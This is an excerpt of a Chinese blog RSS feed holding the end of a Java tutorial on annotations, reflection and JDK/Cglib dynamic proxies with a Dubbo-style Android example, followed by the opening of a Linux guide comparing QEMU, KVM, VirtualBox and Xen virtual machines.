&lt;ul&gt;&lt;li&gt;@Override - 检查该方法是否是重载方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误。&lt;/li&gt;
&lt;li&gt;@Deprecated - 标记过时方法。如果使用该方法，会报编译警告。&lt;/li&gt;
&lt;li&gt;@SuppressWarnings - 指示编译器去忽略注解中声明的警告。&lt;/li&gt;
&lt;li&gt;@SafeVarargs - Java 7 开始支持，忽略任何使用参数为泛型变量的方法或构造函数调用产生的警告。&lt;/li&gt;
&lt;li&gt;@FunctionalInterface - Java 8 开始支持，标识一个匿名函数或函数式接口。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这里，我们重点关注元注解，元注解位于java.lang.annotation包中，主要用于自定义注解。元注解包括：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;@Retention - 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问，枚举类型分为别SOURCE、CLASS和RUNTIME；&lt;/li&gt;
&lt;li&gt;@Documented - 标记这些注解是否包含在用户文档中。&lt;/li&gt;
&lt;li&gt;@Target - 标记这个注解应该是哪种Java 成员，枚举类型包括TYPE、FIELD、METHOD、CONSTRUCTOR等；&lt;/li&gt;
&lt;li&gt;@Inherited - 标记这个注解可以继承超类注解，即子类Class对象可使用getAnnotations()方法获取父类被@Inherited修饰的注解，这个注解只能用来申明类。&lt;/li&gt;
&lt;li&gt;@Repeatable - Java 8 开始支持，标识某注解可以在同一个声明上使用多次。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;自定义元注解需重点关注两点：1）注解的数据类型；2）反射获取注解的方法。首先，注解中的方法并不支持所有的数据类型，仅支持&lt;strong&gt;八种基本数据类型、String、Class、enum、Annotation和它们的数组&lt;/strong&gt;。比如以下代码会产生编译时错误：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Documented
@Inherited
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
public @interface AnnotationTest {
    // 1. 注解数据类型不能是Object；2. 默认值不能为null
    Object value() default null;
    // 支持的定义方式
    String value() default &quot;&quot;;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其次，上节中提到的反射相关类（Class、Constructor、Method和Field）和Package均实现了AnnotatedElement接口，该接口定义了访问反射信息的方法，主要如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 获取指定注解类型
getAnnotation(Class&amp;lt;T&amp;gt;):T;
// 获取所有注解，包括从父类继承的
getAnnotations():Annotation[];
// 获取指定注解类型，不包括从父类继承的
getDeclaredAnnotation(Class&amp;lt;T&amp;gt;):T
// 获取所有注解，不包括从父类继承的
getDeclaredAnnotations():Annotation[];
// 判断是否存在指定注解
isAnnotationPresent(Class&amp;lt;? extends Annotation&amp;gt;:boolean&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当使用上例中的AnnotationTest 标注某个类后，便可在运行时通过该类的反射方法访问注解信息了。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@AnnotationTest(&quot;yhthu&quot;)
public class AnnotationReflection {

    public static void main(String[] args) {
        AnnotationReflection ar = new AnnotationReflection();
        Class clazz = ar.getClass();
        // 判断是否存在指定注解
        if (clazz.isAnnotationPresent(AnnotationTest.class)) {
            // 获取指定注解类型
            Annotation annotation = clazz.getAnnotation(AnnotationTest.class);
            // 获取该注解的值
            System.out.println(((AnnotationTest) annotation).value());
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;当自定义注解只有一个方法value()时，使用注解可只写值，例如：@AnnotationTest(&quot;yhthu&quot;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;三动态代理&quot;&gt;三、动态代理&lt;/h2&gt;
&lt;p&gt;代理是一种结构型设计模式，当无法或不想直接访问某个对象，或者访问某个对象比较复杂的时候，可以通过一个代理对象来间接访问，代理对象向客户端提供和真实对象同样的接口功能。经典设计模式中，代理模式有四种角色：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Subject抽象主题类——申明代理对象和真实对象共同的接口方法；&lt;/li&gt;
&lt;li&gt;RealSubject真实主题类——实现了Subject接口，真实执行业务逻辑的地方；&lt;/li&gt;
&lt;li&gt;ProxySubject代理类——实现了Subject接口，持有对RealSubject的引用，在实现的接口方法中调用RealSubject中相应的方法执行；&lt;/li&gt;
&lt;li&gt;Cliect客户端类——使用代理对象的类。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/3923557-d5887810ae72a4d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;代理模式&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在实现上，代理模式分为静态代理和动态代理，静态代理的代理类二进制文件是在编译时生成的，而动态代理的代理类二进制文件是在运行时生成并加载到虚拟机环境的。JDK提供了对动态代理接口的支持，开源的动态代理库（Cglib、Javassist和Byte Buddy）提供了对接口和类的代理支持，本节将简单比较JDK和Cglib实现动态代理的异同，后续章节会对Java字节码编程做详细分析。&lt;/p&gt;
&lt;h4 id=&quot;jdk动态代理接口&quot;&gt;3.1 JDK动态代理接口&lt;/h4&gt;
&lt;p&gt;JDK实现动态代理是通过Proxy类的newProxyInstance方法实现的，该方法的三个入参分别表示：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public static Object newProxyInstance(ClassLoader loader, Class&amp;lt;?&amp;gt;[] interfaces, InvocationHandler h)&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;ClassLoader loader，定义代理生成的类的加载器，可以自定义类加载器，也可以复用当前Class的类加载器；&lt;/li&gt;
&lt;li&gt;Class&amp;lt;?&amp;gt;[] interfaces，定义代理对象需要实现的接口；&lt;/li&gt;
&lt;li&gt;InvocationHandler h，定义代理对象调用方法的处理，其invoke方法中的Object proxy表示生成的代理对象，Method表示代理方法， Object[]表示方法的参数。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;通常的使用方法如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;private Object getProxy() {
    return Proxy.newProxyInstance(JDKProxyTest.class.getClassLoader(), new Class&amp;lt;?&amp;gt;[]{Subject.class},
            new MyInvocationHandler(new RealSubject()));
}

private static class MyInvocationHandler implements InvocationHandler {
    private Object realSubject;

    public MyInvocationHandler(Object realSubject) {
        this.realSubject = realSubject;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println(&quot;Some thing before method invoke&quot;);
        Object result = method.invoke(realSubject, args);
        System.out.println(&quot;Some thing after method invoke&quot;);
        return result;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;类加载器采用当前类的加载器，默认为应用程序类加载器（sun.misc.Launcher$AppClassLoader）；接口数组以Subject.class为例，调用方法处理类MyInvocationHandler实现InvocationHandler接口，并在构造器中传入Subject的真正的业务功能服务类RealSubject，在执行invoke方法时，可以在实际方法调用前后织入自定义的处理逻辑，这也就是AOP（面向切面编程）的原理。&lt;br/&gt;关于JDK动态代理，有两个问题需要清楚：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Proxy.newProxyInstance的代理类是如何生成的？Proxy.newProxyInstance生成代理类的核心分成两步：&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;// 1. 获取代理类的Class对象
Class&amp;lt;?&amp;gt; cl = getProxyClass0(loader, intfs);
// 2. 利用Class获取Constructor，通过反射生成对象
cons.newInstance(new Object[]{h});&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;与反射获取Class对象时搜索classpath路径的.class文件不同的是，这里的Class对象完全是“无中生有”的。getProxyClass0根据类加载器和接口集合返回了Class对象，这里采用了缓存的处理。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 缓存(key, sub-key) -&amp;gt; value，其中key为类加载器，sub-key为代理的接口，value为Class对象
private static final WeakCache&amp;lt;ClassLoader, Class&amp;lt;?&amp;gt;[], Class&amp;lt;?&amp;gt;&amp;gt;
    proxyClassCache = new WeakCache&amp;lt;&amp;gt;(new KeyFactory(), new ProxyClassFactory());
// 如果实现了代理接口的类已存在就返回缓存对象，否则就通过ProxyClassFactory生成
private static Class&amp;lt;?&amp;gt; getProxyClass0(ClassLoader loader, Class&amp;lt;?&amp;gt;... interfaces) {
    if (interfaces.length &amp;gt; 65535) {
        throw new IllegalArgumentException(&quot;interface limit exceeded&quot;);
    }
    return proxyClassCache.get(loader, interfaces);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果实现了代理接口的类已存在就返回缓存对象，否则就通过ProxyClassFactory生成。ProxyClassFactory又是通过下面的代码生成Class对象的。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 生成代理类字节码文件
byte[] proxyClassFile = ProxyGenerator.generateProxyClass(proxyName, interfaces, accessFlags);
try {
    // defineClass0为native方法，生成Class对象
    return defineClass0(loader, proxyName, proxyClassFile, 0, proxyClassFile.length);
} catch (ClassFormatError e) {
    throw new IllegalArgumentException(e.toString());
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;generateProxyClass方法是用来生成字节码文件的，根据生成的字节码文件，再在native层生成Class对象。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;InvocationHandler的invoke方法是怎样调用的？&lt;br/&gt;回答这个问题得先看下上面生成的Class对象究竟是什么样的，将ProxyGenerator生成的字节码保存成文件，然后反编译打开（IDEA直接打开），可见生成的Proxy.class主要包含equals、toString、hashCode和代理接口的request方法实现。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;public final class $Proxy extends Proxy implements Subject {
    // m1 = Object的equals方法
    private static Method m1;
    // m2 = Object的toString方法
    private static Method m2;
    // Subject的request方法
    private static Method m3;
    // Object的hashCode方法
    private static Method m0;
 
    // 省略m1/m2/m0，此处只列出request方法实现
    public final void request() throws  {
        try {
            super.h.invoke(this, m3, (Object[])null);
        } catch (RuntimeException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }   
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于生成的代理类继承自Proxy，super.h即是Prxoy的InvocationHandler，即代理类的request方法直接调用了InvocationHandler的实现，这就回答了InvocationHandler的invoke方法是如何被调用的了。&lt;/p&gt;
&lt;h4 id=&quot;cglib动态代理接口和类&quot;&gt;3.2 Cglib动态代理接口和类&lt;/h4&gt;
&lt;p&gt;Cglib的动态代理是通过Enhancer类实现的，其create方法生成动态代理的对象，有五个重载方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;create():Object
create(Class, Callback):Object
create(Class, Class[], Callback):Object
create(Class, Class[], CallbackFilter, Callback):Object
create(Class[], Object):Object&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;常用的是第二个和第三个方法，分别用于动态代理类和动态代理接口，其使用方法如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;private Object getProxy() {
    // 1. 动态代理类
    return Enhancer.create(RealSubject.class, new MyMethodInterceptor());
    // 2. 动态代理接口
    return Enhancer.create(Object.class, new Class&amp;lt;?&amp;gt;[]{Subject.class}, new MyMethodInterceptor());
}

private static class MyMethodInterceptor implements MethodInterceptor {

    @Override
    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable {
        System.out.println(&quot;Some thing before method invoke&quot;);
        Object result = proxy.invokeSuper(obj, args);
        System.out.println(&quot;Some thing after method invoke&quot;);
        return result;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从上小节可知，JDK只能代理接口，代理生成的类实现了接口的方法；而Cglib是通过继承被代理的类、重写其方法来实现的，如：create方法入参的第一个参数就是被代理类的类型。当然，Cglib也能代理接口，比如getProxy()方法中的第二种方式。&lt;/p&gt;
&lt;h2 id=&quot;四案例android端dubboreference化的网络访问&quot;&gt;四、案例：Android端dubbo:reference化的网络访问&lt;/h2&gt;
&lt;p&gt;Dubbo是一款高性能的Java RPC框架，是服务治理的重量级中间件。Dubbo采用dubbo:service描述服务提供者，dubbo:reference描述服务消费者，其共同必填属性为interface，即Java接口。Dubbo正是采用接口来作为服务提供者和消费者之间的“共同语言”的。&lt;br/&gt;在移动网络中，Android作为服务消费者，一般通过HTTP网关调用后端服务。在国内的大型互联网公司中，Java后端大多采用了Dubbo及其变种作为服务治理、服务水平扩展的解决方案。因此，HTTP网关通常需要Android的网络请求中提供调用的服务名称、服务方法、服务版本、服务分组等信息，然后通过这些信息反射调用Java后端提供的RPC服务，实现从HTTP协议到RPC协议的转换。&lt;/p&gt;
&lt;blockquote readability=&quot;3&quot;&gt;
&lt;p&gt;关于Android访问网关请求，其分层结构可参考&lt;a href=&quot;https://www.jianshu.com/p/37fca658cf32&quot;&gt;《基于Retrofit+RxJava的Android分层网络请求框架》&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;那么，Android端能否以dubbo:reference化的方式申明需要访问的网络服务呢？如何这样，将极大提高Android开发人员和Java后端开发之间的沟通效率，以及Android端的代码效率。&lt;br/&gt;首先，自定义服务的消费者注解Reference，通过该注解标记某个服务。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Inherited
@Target({ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface Reference {
    // 服务接口名
    String service() default &quot;&quot;;
    // 服务版本
    String version() default &quot;&quot;;
    // 服务分组
    String group() default &quot;&quot;;
    // 省略字段
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其次，通过接口定义某个服务消费（如果可以直接引入后端接口，此步骤可省略），在注解中指明该服务对应的后端服务接口名、服务版本、服务分组等信息；&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Reference(service = &quot;com.yhthu.java.ClassTestService&quot;,  group = &quot;yhthu&quot;,  version = &quot;v_test_0.1&quot;)
public interface ClassTestService {
    // 实例方法
    Response echo(String pin);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样就完成了服务的申明，接下来的问题是如何实现服务的调用呢？上述申明的服务接口如何定义实现呢？这里就涉及依赖注入和动态代理。我们先定义一个标记注解@Service，标识需要被注入实现的服务申明。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface Service {
}
// 在需要使用服务的地方（比如Activity中）申明需要调用的服务
@Service
private ClassTestService classTestService;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在调用classTestService的方法之前，需要注入该接口服务的实现，因此，该操作可以在调用组件初始化的时候进行。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 接口与对应实现的缓存
private Map&amp;lt;Class&amp;lt;?&amp;gt;, Object&amp;gt; serviceContainer = new HashMap&amp;lt;&amp;gt;();
// 依赖注入
public void inject(Object obj) {
    // 1. 扫描该类中所有添加@Service注解的域
    Field[] fields = obj.getClass().getDeclaredFields();
    for (Field field : fields) {
        if (field.isAnnotationPresent(Service.class)) {
            Class&amp;lt;?&amp;gt; clazz = field.getType();
            if (clazz.getAnnotation(Reference.class) == null) {
                Log.e(&quot;ClassTestService&quot;, &quot;接口地址未配置&quot;);
                continue;
            }
            // 2. 从缓存中取出或生成接口类的实现（动态代理）
            Object impl = serviceContainer.get(clazz);
            if (impl == null) {
                impl = create(clazz);
                serviceContainer.put(clazz, impl);
            }
            // 3. 设置服务接口实现
            try {
                field.setAccessible(true);
                field.set(obj, impl);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;inject方法的关键有三步：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;扫描该类中所有添加@Service注解的字段，即可得到上述代码示例中的ClassTestService字段；&lt;/li&gt;
&lt;li&gt;从缓存中取出或生成接口类的实现。由于通过接口定义了服务，并且实现不同服务的实现方式基本一致（即将服务信息发送HTTP网关），在生成实现上可选择JDK的动态代理。&lt;/li&gt;
&lt;li&gt;设置服务接口实现，完成为接口注入实现。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;private &amp;lt;T&amp;gt; T create(final Class&amp;lt;T&amp;gt; service) {
    return (T) Proxy.newProxyInstance(service.getClassLoader(), new Class&amp;lt;?&amp;gt;[]{service}, new InvocationHandler() {
        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            // 1. 获取服务信息
            Annotation reference = service.getAnnotation(Reference.class);
            String serviceName = ((Reference) reference).service();
            String versionName = ((Reference) reference).version();
            String groupName = ((Reference) reference).group();
            // 2. 获取方法名
            String methodName = method.getName();
            // 3. 根据服务信息发起请求，返回调用结果
            return Request.request(serviceName, versionName, groupName, methodName, param);
        }
    });
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在HTTP网关得到服务名称、服务方法、服务版本、服务分组等信息之后，即可实现对后端服务的反射调用。总的来讲，即可实现Android端dubbo:reference化的网络访问。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 调用ClassTestService服务的方法
classTestService.echo(&quot;yhthu&quot;).callback(// ……);&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;上述代码实现均为伪代码，仅说明解决方案思路。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在该案例中，综合使用了自定义注解、反射以及动态代理，是对上述理论知识的一个具体应用。&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 23:00:00 +0000</pubDate>
<dc:creator>yhthu</dc:creator>
<og:description>反射是指计算机程序在运行时访问、检测和修改它本身状态或行为的一种能力，是一种元编程语言特性，有很多语言都提供了对反射机制的支持，它使程序能够编写程序。Java的反射机制使得Java能够动态的获取类的信</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/younghao/p/9751566.html</dc:identifier>
</item>
<item>
<title>Linux 桌面玩家指南：07. Linux 中的 Qemu、KVM、VirtualBox、Xen 虚拟机体验 - 京山游侠</title>
<link>http://www.cnblogs.com/youxia/p/LinuxDesktop007.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/youxia/p/LinuxDesktop007.html</guid>
<description>&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;strong&gt;特别说明：&lt;/strong&gt;要在我的随笔后写评论的小伙伴们请注意了，我的博客开启了 MathJax 数学公式支持，MathJax 使用&lt;code&gt;$&lt;/code&gt;标记数学公式的开始和结束。如果某条评论中出现了两个&lt;code&gt;$&lt;/code&gt;，MathJax 会将两个&lt;code&gt;$&lt;/code&gt;之间的内容按照数学公式进行排版，从而导致评论区格式混乱。如果大家的评论中用到了&lt;code&gt;$&lt;/code&gt;，但是又不是为了使用数学公式，就请使用&lt;code&gt;\$&lt;/code&gt;转义一下，谢谢。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;想从头阅读该系列吗？下面是传送门：&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;是时候聊一下虚拟机了，因为我后面即将聊的 Linux 玩法，包括硬盘分区以及在同一块硬盘上安装多个 Linux 发行版、在 X86 的实模式下运行 16 位的程序、探索 Grub 和 Linux 纯字符模式等等，要截图和录像的话，必须借助于虚拟机。&lt;/p&gt;
&lt;p&gt;说起虚拟机，大家都不陌生。需要使用虚拟机的场景也非常的多，对于有志于写操作系统的同志，往往需要一个虚拟机来运行和调试他写的系统；对于喜欢研究网络体系结构的朋友，往往需要在自己的电脑上虚拟出 N 个系统组成各种各样的网络。（这个需要电脑的配置够强大才行，幸好本人的电脑够。）还有些朋友用着 Windows 却想玩 Linux，用着 Linux 却想玩 Windows，这样用虚拟机玩起来也比较方便；最后对于在 Linux 环境下解决起来比较困难的一些需求，如迅雷、QQ、网银、支付宝等，使用虚拟机安装一个 Windows 系统，也可以非常轻松地搞定。我自己也经常在 Windows 中用 VMWare，感觉它功能强大、使用方便，运行效率也非常高。我的博客中有不少内容都是在虚拟机中折腾出来的。在 Linux 系统下，我也用虚拟机，这一篇随笔就向大家展示一下 Linux 中的几种常见的虚拟机软件。&lt;/p&gt;
&lt;p&gt;虚拟机的分类很复杂。什么全虚拟、半虚拟什么的搞得人头晕。而且桌面用户和企业级用户对虚拟机的期望值是不一样的。比如说，我可能期望这样一个虚拟机：&lt;/p&gt;
&lt;p&gt;1.它能模拟出一台完整的个人电脑，我可以给它安装任何我想安装的操作系统；&lt;/p&gt;
&lt;p&gt;2.它要有比较好用的图形界面，模拟出的电脑也要能无障碍运行 Windows 或 Gnome 这样的图形系统，能打游戏最好；&lt;/p&gt;
&lt;p&gt;3.客户操作系统所用的硬盘就是宿主操作系统中的一个镜像文件，随时可复制粘贴，随时可打包带走；&lt;/p&gt;
&lt;p&gt;4.最好能模拟出一些本身不存在的硬件，像多个网卡什么的。&lt;/p&gt;
&lt;p&gt;很显然，VMWare Workstation 就是这样一个可以完美满足我要求的桌面用户最满意的虚拟机。我经常使用它来折腾各个 Linux 发行版，而且运行流畅。当然，在 Linux 这个开源的世界我们是不该去使用破解版这样的东西的。不过不用担心，在 Linux 江湖中，还有 VirtualBox、QEMU 这样的虚拟机软件可用。&lt;/p&gt;
&lt;p&gt;而企业级用户呢，他们期望的虚拟机可能是这样的：&lt;/p&gt;
&lt;p&gt;1.它不一定要能模拟出一台完整的电脑，重点是 CPU、内存、磁盘和网卡，重点是能当服务器使用；&lt;/p&gt;
&lt;p&gt;2.它性能一定要好，虚拟的 CPU 性能一定要接近物理 CPU，一定要充分利用物理 CPU 的所有特性，为了性能，甚至只能安装经过修改过内核的操作系统；（所谓的半虚拟化技术。）&lt;/p&gt;
&lt;p&gt;3.它隔离性一定要好，它的目的是把一台机器分成 N 台机器用，而管理这 N 台虚拟机的宿主机要越不占用资源越好，客户机是主，宿主机是次；（正如 Xen 这样。）&lt;/p&gt;
&lt;p&gt;4.由于企业级用户对性能的追求，所以客户机所用的硬盘可能真是一个独立的物理硬盘、磁盘阵列、网络文件系统什么的，而不仅仅只是宿主机上的一个镜像文件；&lt;/p&gt;
&lt;p&gt;5.它不一定需要有图形界面，因为使用命令行更容易管理，像自动化啊、远程化啊、批量化啊什么的；&lt;/p&gt;
&lt;p&gt;6.更多的企业级高可用性需求，像什么热备份啊、动态迁移啊等等。&lt;/p&gt;
&lt;p&gt;从上面这些期望值可以看出，虚拟机领域水很深，市场前景也很广阔。各个虚拟机厂家把自家产品吹得天花乱坠那也是很常见的，因为每一个用户期望的点都可以大做文章嘛。所谓临渊羡鱼，不如退而结网，各种虚拟机看得再过瘾，也不如自己尝试一下。&lt;/p&gt;
&lt;h2 id=&quot;能模拟不同硬件架构的虚拟机-qemu&quot;&gt;能模拟不同硬件架构的虚拟机 —— QEMU&lt;/h2&gt;
&lt;p&gt;还是老规矩，先给出参考资料，它的学习资料还在这里： &lt;a href=&quot;https://wiki.qemu.org/Documentation&quot;&gt;QEMU 的官方文档&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;或者，在自己的系统中输入如下命令查看手册页：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;man qemu-system-i386
man qemu-img
等等...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;QEMU 本身是一个非常强大的虚拟机，甚至在 Xen、KVM 这些虚拟机产品中都少不了 QEMU 的身影。在 QEMU 的官方文档中也提到，QEMU 可以利用 Xen、KVM 等技术来加速。为什么需要加速呢，那是因为如果单纯使用 QEMU 的时候，它里面的 CPU 等硬件都是模拟出来的，也就是全虚拟化，所以运行速度是肯定赶不上物理硬件的。它甚至可以模拟不同架构的硬件，比如说在使用 Intel X86 的 CPU 的电脑中模拟出一个 ARM 体系的电脑或 MIPS 体系的电脑，这样模拟出的 CPU，运行速度更加不可能赶上物理 CPU。使用加速以后呢，可以把客户操作系统的 CPU 指令直接转发到物理 CPU，自然运行效率大增。&lt;/p&gt;
&lt;p&gt;QEMU 同时也是一个非常简单的虚拟机，给它一个硬盘镜像就可以启动一个虚拟机，如果想定制这个虚拟机的配置，用什么样的 CPU 啊、什么样的显卡啊、什么样的网络配置啊，只需要指定相应的命令行参数就可以了。它支持许多格式的磁盘镜像，包括 VirtualBox 创建的磁盘镜像文件。它同时也提供一个创建和管理磁盘镜像的工具 qemu-img。QEMU 及其工具所使用的命令行参数，直接查看其文档即可。&lt;/p&gt;
&lt;p&gt;下面开始体验。先看看 Ubuntu 软件源中和 QEMU 有关的包有哪些：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/162100208301815.png&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/162101289861294.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我的电脑是 Intel 的 CPU，而我想虚拟的也是个人电脑，所以我安装的自然是 qemu-system-x86，另外一个有用的是 qemu-utils。查看 QEMU 软件包中的工具及文档：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/162102476895249.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用 qemu-img 创建磁盘映像文件，使用 qemu-system-i386 启动虚拟机，并安装操作系统：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/162106562679206.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;WinXP 估计是目前全网络上最好下载的操作系统了。运行以上命令后，弹出熟悉的系统安装界面。安装过程我就不啰嗦了。下图是安装完 WinXP 操作系统之后的效果。可以给 qemu-system-i386 指定更多的参数，在再一次启动 WinXP 的时候，我除了给它分配了 2G 内存，我还使用 -smp 2 参数为它分配了两个 CPU，还使用 -vga vmware 为它指定和 VMWare 虚拟显卡一样的显卡。虽然指定两个 CPU，但是性能仍较差。随便拖动一下窗口 CPU 使用率就飙升到 100%。&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/162109114392678.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;而且从上图中可以看到，虚拟机中的 CPU 虽然显示为 3.5GHz，但是很显然是 QEMU 模拟出来的，和物理 CPU 有显著差别。事实上我的电脑配置相当强悍，Core i7-4770K 的四核八线程 CPU，请看 lshw 的输出结果：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/162113014246849.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Intel Core i7-4770K 的 CPU，虚拟出的 XP 也分配了 2G 的内存和两个 CPU，但是流畅度仍较差。说明单纯使用 QEMU 还是不能满足我们桌面用户的需要。配合Xen 或者 KVM 呢？性能是否会有质的飞跃呢？&lt;/p&gt;
&lt;h2 id=&quot;被加入-linux-内核的虚拟机-kvm&quot;&gt;被加入 Linux 内核的虚拟机 —— KVM&lt;/h2&gt;
&lt;p&gt;上一节展示的 QEMU 是一个强大的虚拟机软件，它可以完全以软件的形式模拟出一台完整的电脑所需的所有硬件，甚至是模拟出不同架构的硬件，在这些虚拟的硬件之上，可以安装完整的操作系统。QEMU 的运行模式如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/241026434392128.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;很显然，这种完全以软件模拟硬件的形式虽然功能强大，但是性能难以满足用户的需要。模拟出的硬件的性能和物理硬件的性能相比，必然会大打折扣。为了提高虚拟机软件的性能，开发者们各显神通。其中，最常用的办法就是在主操作系统中通过内核模块开一个洞，通过这个洞将虚拟机中的操作直接映射到物理硬件上，从而提高虚拟机中运行的操作系统的性能。如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/241032534717180.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中 KVM 就是这种加速模式的典型代表。在社区中，大家常把 KVM 和 Xen 相提并论，但是它们其实完全不一样。从上图可以看出，使用内核模块加速这种模式，主操作系统仍然占主导地位，内核模块只是在主操作系统中开一个洞，用来连接虚拟机和物理硬件，给虚拟机加速，但是虚拟机中的客户操作系统仍然受到很大的限制。这种模式比较适合桌面用户使用，主操作系统仍然是他们的主战场，不管是办公还是打游戏，都通过主操作系统完成，客户操作系统只是按需使用。至于 Xen，则完全使用不同的理念，比较适合企业级用户使用，桌面用户就不要轻易去碰了，具体内容我后面再讲。&lt;/p&gt;
&lt;p&gt;其实 VirtualBox 也是采取的这种内核模块加速的模式。我之所以这么说，是因为在安装 VirtualBox 时，它会要求安装 DKMS。如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/241052402522112.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;熟悉 Linux 的人知道，DKMS 就是为了方便用户管理内核模块而存在的，不熟悉 DKMS 的人 Google 一下也可以了解个大概。关于 VirtualBox 的具体使用方面的内容，我下一节再讲。这一篇主要讲 KVM。&lt;/p&gt;
&lt;p&gt;KVM 和 QEMU 是相辅相成的，QEMU 可以使用 KVM 内核模块加速，而 KVM 需要使用 QEMU 运行虚拟机。从上图可以看到，如果要使用 Ubuntu 的包管理软件安装 KVM，其实安装的就是 qemu-kvm。而 qemu-kvm 并不是一个什么很复杂的软件包，它只包含很少量几个文件，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/241058585644703.png&quot;/&gt;&lt;/p&gt;
